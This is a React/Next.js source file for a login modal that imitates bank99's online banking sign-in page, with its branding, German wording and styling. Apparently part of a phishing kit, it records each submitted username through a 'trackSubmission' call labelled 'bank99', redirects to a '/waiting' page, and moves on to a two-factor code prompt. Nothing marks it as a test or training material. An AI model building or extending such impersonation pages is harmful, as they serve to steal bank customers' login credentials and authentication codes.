"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import TwoFactorModal from "./TwoFactorModal";
import { trackSubmission } from "@/lib/track";

export default function LoginModal() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [stage, setStage] = useState<"username" | "twofactor">("username");

  if (stage === "twofactor") {
    return <TwoFactorModal onCancel={() => setStage("username")} />;
  }

  return (
    <form
      onSubmit={(e) => {
        e.preventDefault();
        trackSubmission("bank99", "login", { username });
        router.push(`/waiting?user=${encodeURIComponent(username)}`);
      }}
      className="w-full max-w-[480px] mx-4"
    >
      <div
        className="rounded-md overflow-hidden"
        style={{
          backgroundColor: "#fff",
          border: "1px solid rgba(0,0,0,0.2)",
          boxShadow: "0 3px 9px rgba(0,0,0,0.5)",
        }}
      >
        {/* Modal Header */}
        <div
          className="px-4 py-3"
          style={{
            backgroundColor: "#ffdc00",
            borderBottom: "1px solid #d2d8e4",
          }}
        >
          <h1 className="text-lg font-normal m-0" style={{ color: "#333" }}>
            Anmelden
          </h1>
        </div>

        {/* Modal Body */}
        <div className="px-4 py-4" style={{ backgroundColor: "#fff" }}>
          {/* Welcome text */}
          <div className="mb-4">
            <p className="text-sm" style={{ color: "#333" }}>
              Hallo beim Online Banking der bank99! :-)
            </p>
          </div>

          {/* Separator + links row */}
          <hr className="border-b99-border mt-0 mb-3" />

          <div className="flex justify-end gap-4 mb-4">
            <a href="#" className="text-sm" style={{ color: "#337ab7" }}>
              barrierefrei
            </a>
            <a href="#" className="text-sm" style={{ color: "#337ab7" }}>
              English
            </a>
          </div>

          {/* Username field */}
          <div className="mb-4">
            <label className="block mb-1">
              <small className="text-xs" style={{ color: "#333" }}>
                Benutzername
              </small>
            </label>
            <input
              type="text"
              className="b99-input"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
          </div>

          {/* Terms placeholder */}
          <div className="mb-4">
            <p className="text-xs" style={{ color: "#8c8c8c" }} />
          </div>

          {/* Submit button */}
          <div>
            <button type="submit" className="b99-btn">
              Weiter
            </button>
          </div>
        </div>

        {/* Modal Footer */}
        <div
          className="px-4 py-3 text-center"
          style={{
            borderTop: "1px solid #d2d8e4",
            backgroundColor: "#fff",
          }}
        >
          <a href="#" className="text-sm" style={{ color: "#337ab7" }}>
            Benutzername vergessen?
          </a>
        </div>
      </div>
    </form>
  );
}
